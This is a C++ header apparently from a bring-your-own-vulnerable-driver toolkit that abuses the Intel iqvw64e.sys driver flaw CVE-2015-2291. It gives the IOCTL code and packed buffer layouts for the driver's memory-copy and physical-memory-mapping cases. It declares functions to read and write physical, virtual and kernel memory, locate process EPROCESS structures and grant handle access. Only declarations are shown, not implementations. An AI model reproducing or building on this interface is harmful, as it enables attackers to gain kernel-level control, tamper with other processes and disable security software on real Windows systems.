#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdint>
#include <string>

// iqvw64e.sys IOCTL interface (CVE-2015-2291)
namespace intel {

constexpr DWORD IOCTL1 = 0x80862007;

#pragma pack(push, 1)
struct COPY_MEMORY_BUFFER_INFO {
    uint64_t case_number;               // 0x33
    uint64_t reserved;
    uint64_t source;
    uint64_t destination;
    uint64_t length;
};

struct MAP_IO_SPACE_BUFFER_INFO {
    uint64_t case_number;               // 0x19
    uint64_t reserved;
    uint64_t return_value;
    uint64_t return_virtual_address;
    uint64_t physical_address_to_map;
    uint32_t size;
};

struct UNMAP_IO_SPACE_BUFFER_INFO {
    uint64_t case_number;               // 0x1A
    uint64_t reserved;
    uint64_t reserved2;
    uint64_t virt_address;
    uint64_t reserved3;
    uint32_t number_of_bytes;
};
#pragma pack(pop)

// Kernel module info from NtQuerySystemInformation
struct RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
};

struct RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
};

bool     LoadDriver(const std::wstring& driver_path);
void     UnloadDriver();
HANDLE   GetDeviceHandle();

// Maps physical memory to kernel virtual address
uint64_t MapIoSpace(uint64_t phys_addr, uint32_t size);
bool     UnmapIoSpace(uint64_t mapped_addr, uint32_t size);

// Kernel-mode memcpy via IOCTL
bool     DriverCopy(uint64_t dest, uint64_t src, uint64_t size);

// Read/write physical memory (MapIoSpace + CopyMemory)
bool     ReadPhysicalMemory(uint64_t phys_addr, void* buffer, uint32_t size);
bool     WritePhysicalMemory(uint64_t phys_addr, const void* buffer, uint32_t size);

uint64_t FindKernelBase();
uint64_t ResolveKernelExport(uint64_t kernel_base, const char* func_name);

uint64_t GetProcessDTB(uint64_t kernel_base, DWORD pid);
bool     ReadVirtualMemory(uint64_t dtb, uint64_t virt_addr, void* buffer, uint64_t size);
bool     WriteVirtualMemory(uint64_t dtb, uint64_t virt_addr, const void* buffer, uint64_t size);
uint64_t TranslateVirtualToPhysical(uint64_t dtb, uint64_t virt_addr);

bool     ReadKernelMemory(uint64_t kernel_va, void* buffer, uint64_t size);
bool     WriteKernelMemory(uint64_t kernel_va, const void* buffer, uint64_t size);

uint64_t FindEPROCESS(uint64_t kernel_base, DWORD pid);
bool     GrantHandleAccess(uint64_t kernel_base, HANDLE handle);

} // namespace intel
